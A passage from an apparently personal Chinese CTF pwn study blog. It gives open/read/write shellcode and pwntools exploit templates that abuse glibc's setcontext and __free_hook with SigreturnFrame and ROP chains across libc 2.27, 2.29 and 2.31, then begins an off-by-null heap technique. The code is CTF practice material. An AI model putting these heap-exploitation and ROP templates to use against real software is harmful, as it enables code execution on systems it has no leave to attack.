punctuation">)</span></code></pre><p>这是用pwntools的shellcraft模块生成的</p><p>或者是直接手撸汇编</p><pre class=" language-assembly"><code class="language-assembly">shellcode = asm('''    push 0x67616c66    mov rdi,rsp    xor esi,esi    push 2    pop rax    syscall /*open("flag",0)*/    mov rdi,rax    mov rsi,rsp    mov edx,0x100    xor eax,eax    syscall /*read(rax,rsp,0x100)*/    mov edi,1    mov rsi,rsp    push 1    pop rax    syscall /*write(1,rsp,0x100)*/    ''')</code></pre><p>不过一般情况下能用rop链代替的我都用rop链来</p><p>盲注不仅存在于web的sql注入中，在pwn中也一样存在(不过应该只是在ctf中，但考察的是选手的汇编语言能力)。</p><p>比如蓝帽杯线下的slient，需要将flag一位一位比较出来。</p><p>不过我的汇编基础不够扎实，shellcode题目向来都很头大，难受。</p><h2 id="0xD-glibc线程"><a href="#0xD-glibc线程" class="headerlink" title="0xD.glibc线程"></a>0xD.glibc线程</h2><blockquote><p>在glibc中，线程有自己的arena，但是arena的个数是有限的，一般跟处理器核心个数有关，假如线程个数超过arena总个数，并且执行线程都在使用，那么该怎么办呢。Glibc会遍历所有的arena，首先是从主线程的main_arena开始，尝试lock该arena，如果成功lock，那么就把这个arena给线程使用。</p></blockquote><p>我们通常使用的是main_arena这个线程管理的堆</p><h2 id="0xE-ORW"><a href="#0xE-ORW" class="headerlink" title="0xE.ORW"></a>0xE.ORW</h2><p>在堆漏洞的题目中，为了增加题目难度会禁用execve系统调用，orw就将登场</p><p>无论是2.27，2.29，2.30还是2.31的libc，为了能够执行orw都使用了一个setcontext函数，可以看到这个函数能够设置绝大多数寄存器</p><pre class=" language-assembly"><code class="language-assembly"><setcontext>:     push   rdi<setcontext+1>:   lea    rsi,[rdi+0x128]<setcontext+8>:   xor    edx,edx<setcontext+10>:  mov    edi,0x2<setcontext+15>:  mov    r10d,0x8<setcontext+21>:  mov    eax,0xe<setcontext+26>:  syscall <setcontext+28>:  pop    rdi<setcontext+29>:  cmp    rax,0xfffffffffffff001<setcontext+35>:  jae    0x7ffff7a7d520 <setcontext+128><setcontext+37>:  mov    rcx,QWORD PTR [rdi+0xe0]<setcontext+44>:  fldenv [rcx]<setcontext+46>:  ldmxcsr DWORD PTR [rdi+0x1c0]<setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]<setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]<setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]<setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]<setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]<setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]<setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]<setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]<setcontext+94>:  push   rcx<setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]<setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]<setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]<setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]<setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]<setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]<setcontext+125>: xor    eax,eax<setcontext+127>: ret    <setcontext+128>: mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78<setcontext+135>: neg    eax<setcontext+137>: mov    DWORD PTR fs:[rcx],eax<setcontext+140>: or     rax,0xffffffffffffffff<setcontext+144>: ret</code></pre><p>而我们并不是从头到尾地使用setcontext函数，而是从setcontext+53开始调用，这是因为在setcontext+44处地指令<code>fldenv [rcx]</code>会使程序crash</p><p>首先来说明2.27的libc下orw的构造</p><pre class=" language-assembly"><code class="language-assembly"><setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]<setcontext+94>:  push   rcx</code></pre><p>从这两条指令可以看出，从[rdi+0xa8]弹到rcx的值将会是rip</p><p>setcontext的利用分两种，一种需要libc地址和heap地址，另一种只需要libc地址，先说只要libc地址的</p><p>构造模板如下</p><pre class=" language-python"><code class="language-python">free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>setcontext <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span>利用double free或者overlap将free_hook修改为setcontext<span class="token operator">+</span><span class="token number">53</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span><span class="token punctuation">)</span>接着伪造栈空间frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">0</span>          <span class="token comment" spellcheck="true">#调用read</span>frame<span class="token punctuation">.</span>rdi<span class="token operator">=</span><span class="token number">0</span>          <span class="token comment" spellcheck="true">#参数1     </span>frame<span class="token punctuation">.</span>rsi<span class="token operator">=</span>free_hook<span class="token operator">&amp;</span><span class="token number">0xfffffffffffff000</span>    <span class="token comment" spellcheck="true">#参数2 往free_hook&amp;0xfffffffffffff000写</span>frame<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0x2000</span>                          <span class="token comment" spellcheck="true">#参数3 写入0x2000字节</span>frame<span class="token punctuation">.</span>rsp<span class="token operator">=</span>free_hook<span class="token operator">&amp;</span><span class="token number">0xfffffffffffff000</span>    <span class="token comment" spellcheck="true">#执行完read调用后跳转到free_hook&amp;0xfffffffffffff000</span>frame<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall                         <span class="token comment" spellcheck="true">#rip，执行系统调用</span>payload<span class="token operator">=</span>str<span class="token punctuation">(</span>frame<span class="token punctuation">)</span>将payload写入到某个chunk中，假设这个chunk序号为<span class="token number">8</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>然后free掉这个chunk触发setcontextfree<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>接着我们就能往free_hook<span class="token operator">&amp;</span><span class="token number">0xfffffffffffff00</span>写入shellcodepayload <span class="token operator">=</span> <span class="token punctuation">[</span>    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdi; ret;</span>    free_hook <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">,</span>    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rsi; ret;</span>    <span class="token number">0x2000</span><span class="token punctuation">,</span>    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdx\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdx; ret;</span>    <span class="token number">7</span><span class="token punctuation">,</span>    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rax\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret;</span>    <span class="token number">10</span><span class="token punctuation">,</span>    syscall<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret;</span>    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"jmp rsp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: jmp rsp;</span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''/*open('flag',0)*/sub rsp, 0x800push 0x67616c66mov rdi, rspxor esi, esimov eax, 2syscallcmp eax, 0js failed/*read(3,rsp,0x100)*/mov edi, eaxmov rsi, rspmov edx, 0x100xor eax, eaxsyscall/*write(1,rsp,0x100)*/mov edx, eaxmov rsi, rspmov edi, 1mov eax, edisyscalljmp exitfailed:push 0x6c696166mov edi, 1mov rsi, rspmov edx, 4mov eax, edisyscallexit:xor edi, edimov eax, 231syscall'''</span><span class="token punctuation">)</span>shellcode就是先通过mprotect将free_hook <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>附近<span class="token number">0x2000</span>的空间设置为可执行，然后进行orw读取flag</code></pre><p>另一种需要堆地址的orw的构造模板如下</p><pre class=" language-python"><code class="language-python">free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>setcontext <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span>利用double free或者overlap将free_hook修改为setcontext<span class="token operator">+</span><span class="token number">53</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span><span class="token punctuation">)</span>将堆的某个地址设置为setcontext执行完后要跳转过来的rsp，在上面布置好ROP链，因为rop执行的是text段的代码，所以不需要mprotect修改权限payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_rsp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rsp  rip</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'./flag\x00\x00'</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_rsp<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_rsp<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#10</span>free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></code></pre><p>再说2.29的orw</p><p>2.29的setcontext如下</p><pre class=" language-assembly"><code class="language-assembly">0x7ffff7e36e00 <setcontext>:    push   rdi0x7ffff7e36e01 <setcontext+1>:    lea    rsi,[rdi+0x128]0x7ffff7e36e08 <setcontext+8>:    xor    edx,edx0x7ffff7e36e0a <setcontext+10>:    mov    edi,0x20x7ffff7e36e0f <setcontext+15>:    mov    r10d,0x80x7ffff7e36e15 <setcontext+21>:    mov    eax,0xe0x7ffff7e36e1a <setcontext+26>:    syscall 0x7ffff7e36e1c <setcontext+28>:    pop    rdx0x7ffff7e36e1d <setcontext+29>:    cmp    rax,0xfffffffffffff0010x7ffff7e36e23 <setcontext+35>:    jae    0x7ffff7e36e80 <setcontext+128>0x7ffff7e36e25 <setcontext+37>:    mov    rcx,QWORD PTR [rdx+0xe0]0x7ffff7e36e2c <setcontext+44>:    fldenv [rcx]0x7ffff7e36e2e <setcontext+46>:    ldmxcsr DWORD PTR [rdx+0x1c0]0x7ffff7e36e35 <setcontext+53>:    mov    rsp,QWORD PTR [rdx+0xa0]0x7ffff7e36e3c <setcontext+60>:    mov    rbx,QWORD PTR [rdx+0x80]0x7ffff7e36e43 <setcontext+67>:    mov    rbp,QWORD PTR [rdx+0x78]0x7ffff7e36e47 <setcontext+71>:    mov    r12,QWORD PTR [rdx+0x48]0x7ffff7e36e4b <setcontext+75>:    mov    r13,QWORD PTR [rdx+0x50]0x7ffff7e36e4f <setcontext+79>:    mov    r14,QWORD PTR [rdx+0x58]0x7ffff7e36e53 <setcontext+83>:    mov    r15,QWORD PTR [rdx+0x60]0x7ffff7e36e57 <setcontext+87>:    mov    rcx,QWORD PTR [rdx+0xa8]0x7ffff7e36e5e <setcontext+94>:    push   rcx0x7ffff7e36e5f <setcontext+95>:    mov    rsi,QWORD PTR [rdx+0x70]0x7ffff7e36e63 <setcontext+99>:    mov    rdi,QWORD PTR [rdx+0x68]0x7ffff7e36e67 <setcontext+103>:    mov    rcx,QWORD PTR [rdx+0x98]0x7ffff7e36e6e <setcontext+110>:    mov    r8,QWORD PTR [rdx+0x28]0x7ffff7e36e72 <setcontext+114>:    mov    r9,QWORD PTR [rdx+0x30]0x7ffff7e36e76 <setcontext+118>:    mov    rdx,QWORD PTR [rdx+0x88]0x7ffff7e36e7d <setcontext+125>:    xor    eax,eax0x7ffff7e36e7f <setcontext+127>:    ret    0x7ffff7e36e80 <setcontext+128>:    mov    rcx,QWORD PTR [rip+0x18dfe9]        # 0x7ffff7fc4e700x7ffff7e36e87 <setcontext+135>:    neg    eax0x7ffff7e36e89 <setcontext+137>:    mov    DWORD PTR fs:[rcx],eax0x7ffff7e36e8c <setcontext+140>:    or     rax,0xffffffffffffffff0x7ffff7e36e90 <setcontext+144>:    ret    </code></pre><p>libc2.29下的setcontext和2.27的区别在于setcontext+53处的代码是将rdx+0xa0处的值赋给了rsp，而不是rdi，因此我们需要一个gadget来操纵rdx</p><p>在libc2.29中有这样一条gadget</p><pre class=" language-assembly"><code class="language-assembly">0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</code></pre><p>当我们free某个chunk时，rdi即为这个chunk的地址，我们将[rdi+8]设置为伪造的rsp的地址，在其中布置好各个寄存器的参数以及orw的rop链；将[rdi]设置为setcontext+0x1d的地址。</p><p>模板如下</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x1b50</span> <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x100</span>frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x100</span>frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x1b50</span> <span class="token operator">+</span> <span class="token number">0x100</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002535f</span> <span class="token comment" spellcheck="true"># : ret</span>frame<span class="token punctuation">.</span>set_regvalue<span class="token punctuation">(</span><span class="token string">'&amp;fpstate'</span><span class="token punctuation">,</span> heap_addr<span class="token punctuation">)</span>str_frame <span class="token operator">=</span> str<span class="token punctuation">(</span>frame<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x1d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0x1b50</span><span class="token punctuation">)</span> <span class="token operator">+</span> str_frame<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">:</span><span class="token punctuation">]</span>layout <span class="token operator">=</span> <span class="token punctuation">[</span>    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret; </span>    <span class="token number">2</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># sys_open("./flag", 0)</span>    libc_base <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret; </span>    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026542</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdi; ret; </span>    <span class="token number">3</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># maybe it is 2</span>    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026f9e</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rsi; ret; </span>    heap_addr <span class="token operator">+</span> <span class="token number">0x10000</span><span class="token punctuation">,</span>    libc_base <span class="token operator">+</span> <span class="token number">0x000000000012bda6</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdx; ret; </span>    <span class="token number">0x100</span><span class="token punctuation">,</span>    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret; </span>    <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># sys_read(flag_fd, heap, 0x100)</span>    libc_base <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret; </span>    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026542</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdi; ret; </span>    <span class="token number">1</span><span class="token punctuation">,</span>    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026f9e</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rsi; ret; </span>    heap_addr <span class="token operator">+</span> <span class="token number">0x10000</span><span class="token punctuation">,</span>    libc_base <span class="token operator">+</span> <span class="token number">0x000000000012bda6</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdx; ret; </span>    <span class="token number">0x100</span><span class="token punctuation">,</span>    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret; </span>    <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># sys_write(1, heap, 0x100)</span>    libc_base <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret; </span>    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026542</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdi; ret; </span>    <span class="token number">0</span><span class="token punctuation">,</span>    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret; </span>    <span class="token number">231</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># exit(0)</span>    libc_base <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret; </span><span class="token punctuation">]</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>layout<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'./flag'</span>add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">print</span> payloadfree<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span></code></pre><p>最后是libc2.31的orw</p><p>由于2.29出题麻烦，所以目前大部分都是2.31的题目</p><p>2.31的setcontext和2.29一样，只是用来操纵rdx的gadget有所区别</p><p>如下</p><pre class=" language-assembly"><code class="language-assembly">0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</code></pre><p>也就是在rdi+8的位置处放frame的地址，在frame+0x20处放setcontext的地址</p><p>模板如下</p><pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token string">'./flag\x00\x00'</span><span class="token punctuation">)</span>frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> heap_orwframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x1000</span>frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> heap_orwframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallstr_frame <span class="token operator">=</span> str<span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#setcontext = libc_base + libc.sym['setcontext'] + 61</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p<span class="token operator">+</span>str_frame<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>frame_addr<span class="token punctuation">)</span>p2 <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>Open<span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>Read<span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>Write<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>p2<span class="token punctuation">)</span></code></pre><h2 id="0xF-off-by-null"><a href="#0xF-off-by-null" class="headerlink" title="0xF.off-by-null"></a>0xF.off-by-null</h2><p>1.shrink the chunk</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>add<span class="token punctuation">(</span><span class="token number">0x1e0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#chunk2进入unsortedbin，chunk3的prvesize为0x1f0</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1 off-by-null,chunk2的size变为0x100,chunk3的size依然为0x1f0</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2从unsortedbin切割</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span 